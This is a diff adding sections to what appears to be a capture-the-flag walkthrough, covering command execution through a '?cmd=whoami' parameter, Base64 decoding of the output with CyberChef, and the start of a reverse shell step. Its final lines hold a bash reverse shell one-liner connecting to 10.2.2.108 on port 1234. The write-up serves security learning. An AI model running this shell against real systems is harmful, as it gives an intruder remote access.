@@ -130,3 +130,27 @@ The result was some encoded text: **d3d3LWRhdGEK**. I took this as a good sign s
 
 ## index.php and remote command execution explained
 If you understood the previous section of the walkthrough, feel free to skip this one. If you want to dive deeper into what we just did, here you go:
+
+As I previously mentioned, typing **?cmd=whoami** was a lucky guess based on past experience. Here is what this code means:
+
+`?cmd`: This is adding a parameter called cmd (short for "command"). When misconfigured, this parameter allows the attacker to run commands on the target system.
+`=whoami`: This is the command that will be run, and it should output the name of the current user on the victim machine. This could be replaced with a number of other commands, such as `id`, but the point is that we are using a simple command to verify whether the command ran successful.
+
+**Note:** While I consider sections like this to be fair game in CTFs, it's worth noting that I would never have guessed the answer if I hadn't completed the Glitch room previously. So if you had to get my help on this part, please don't feel badly about it! This sort of guesswork seems pretty rare in CTFs, and this truly is one of those "if you know, you know" sections. **Keep your head up and keep going!**
+
+## Decoding the text
+CyberChef is my preferred means of decoding text; if you've never used it before, you should consider adding it to your arsenal. I simply copied the encoded text (**d3d3LWRhdGEK**), navigated to the CyberChef website, pasted the text into the input field, and clicked the magic wand in the output field. It produced the output "**www-data**." This is a common username in CTFs.
+
+By doing this, we have verified two things: our remote command execution is working, and the output is being encoded via Base64.
+
+## Decoding the text explained
+The magic wand in CyberChef triggers "magic mode" which automatically detects the type of encoding and attempts to convert it to plaintext.
+
+## Remote command execution (RCE) to reverse shell
+Right now, we have RCE through our browser, but our ability to move through the victim machine's files and change users is nearly nonexistent. We need to acquire a reverse shell; in other words, we need to gain remote access to a user account on the victim machine.
+
+First, we need to create the script for our reverse shell:
+```
+#!/bin/bash
+bash -c "sh -i >& /dev/tcp/10.2.2.108/1234 0>&1"
+```
